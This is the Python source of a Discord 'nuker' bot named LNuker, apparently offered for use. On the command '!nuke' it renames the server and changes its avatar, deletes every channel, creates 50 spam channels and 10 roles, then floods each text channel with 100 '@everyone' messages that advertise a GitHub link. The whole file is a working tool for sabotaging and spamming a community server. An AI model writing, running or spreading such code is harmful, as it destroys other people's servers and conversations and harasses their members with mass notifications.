import discord
import asyncio
import random
import colorama
from colorama import Fore, Style

colorama.init()
client = discord.Client()

@client.event
async def on_ready():
    print(f'{Fore.GREEN}Logged in as - {client.user}{Style.RESET_ALL}')

async def nuker(guild):
    try:
        await guild.edit(name='LNuker')
        with open('avatar.png', 'rb') as f:
            await guild.edit(avatar=f.read())
        print(f'{Fore.YELLOW}Server name and avatar changed{Style.RESET_ALL}')
    except Exception as e:
        print(f'{Fore.RED}Failed to change server name and avatar: {e}{Style.RESET_ALL}')
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'{Fore.YELLOW}Deleted channel: {channel.name}{Style.RESET_ALL}')
        except Exception as e:
            print(f'{Fore.RED}Failed to delete channel: {channel.name} - {e}{Style.RESET_ALL}')
    for _ in range(50):
        try:
            await guild.create_text_channel('nuked-by-lnuker')
            print(f'{Fore.GREEN}Created channel: nuked{Style.RESET_ALL}')
        except Exception as e:
            print(f'{Fore.RED}Failed to create channel: nuked - {e}{Style.RESET_ALL}')
    for _ in range(10):
        try:
            await guild.create_role(name='Nuked by LNuker', color=discord.Color(random.randint(0, 0xFFFFFF)))
            print(f'{Fore.GREEN}Created role: Nuked{Style.RESET_ALL}')
        except Exception as e:
            print(f'{Fore.RED}Failed to create role: Nuked - {e}{Style.RESET_ALL}')

    spam_tasks = []
    for channel in guild.text_channels:
        spam_tasks.append(spam_channel(channel))
    await asyncio.gather(*spam_tasks)

async def spam_channel(channel):
    for _ in range(100):
        try:
            await channel.send('@everyone Nuked by LNuker\nhttps://github.com/linwys')
        except Exception as e:
            pass

@client.event
async def on_message(message):
    if message.content.startswith('!nuke'):
        await nuker(message.guild)

client.run('YOURTOKEN')